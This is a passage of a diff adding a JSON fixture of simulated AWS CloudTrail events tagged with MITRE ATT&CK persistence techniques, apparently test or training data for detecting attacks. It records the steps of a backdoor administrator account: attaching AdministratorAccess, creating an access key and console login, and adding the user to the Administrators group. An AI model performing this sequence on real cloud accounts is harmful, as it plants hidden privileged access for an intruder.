+    },
+    "eventID": "9c734b0c-f708-40c3-b177-161bc38aeb81",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1136 - Create Account",
+    "mitreAttackTactic": "Persistence"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE21683",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA787785651303"
+    },
+    "eventTime": "2024-12-15T12:00:10Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "AttachUserPolicy",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "console.amazonaws.com",
+    "requestParameters": {
+      "userName": "support-automation",
+      "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+    },
+    "responseElements": null,
+    "eventID": "3b16e852-bdfa-4721-a1c5-ee7936c00faf",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1136 - Create Account",
+    "mitreAttackTactic": "Persistence"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE16056",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA805707244408"
+    },
+    "eventTime": "2024-12-15T12:00:20Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "CreateAccessKey",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "Boto3/1.34.0 Python/3.11.5",
+    "requestParameters": {
+      "userName": "support-automation"
+    },
+    "responseElements": {
+      "accessKey": {
+        "userName": "support-automation",
+        "accessKeyId": "AKIANEWKEY12345678",
+        "status": "Active",
+        "secretAccessKey": "REDACTED"
+      }
+    },
+    "eventID": "23847f4e-cdd9-4c9c-ac3a-b011103632d6",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1136 - Create Account",
+    "mitreAttackTactic": "Persistence"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE55735",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA869917218138"
+    },
+    "eventTime": "2024-12-15T12:00:30Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "CreateLoginProfile",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "console.amazonaws.com",
+    "requestParameters": {
+      "userName": "support-automation",
+      "passwordResetRequired": false
+    },
+    "responseElements": {
+      "loginProfile": {
+        "userName": "support-automation"
+      }
+    },
+    "eventID": "683b28b2-eba2-46f3-8e24-a9b794e7ecd7",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1136 - Create Account",
+    "mitreAttackTactic": "Persistence"
+  },
+  {
+    "eventVersion": "1.09",
+    "userIdentity": {
+      "type": "IAMUser",
+      "principalId": "AIDAEXAMPLE23002",
+      "arn": "arn:aws:iam::123456789012:user/alice@corp.com",
+      "accountId": "123456789012",
+      "userName": "alice@corp.com",
+      "accessKeyId": "ASIA765200410426"
+    },
+    "eventTime": "2024-12-15T12:00:40Z",
+    "eventSource": "iam.amazonaws.com",
+    "eventName": "AddUserToGroup",
+    "awsRegion": "us-east-1",
+    "sourceIPAddress": "185.220.101.47",
+    "userAgent": "console.amazonaws.com",
+    "requestParameters": {
+      "userName": "support-automation",
+      "groupName": "Administrators"
+    },
+    "responseElements": null,
+    "eventID": "068444b6-0243-46b8-9647-f415ef039eca",
+    "eventType": "AwsApiCall",
+    "recipientAccountId": "123456789012",
+    "mitreAttackTechnique": "T1136 - Create Account",
+    "mitreAttackTactic": "Persistence"
+  }
+]
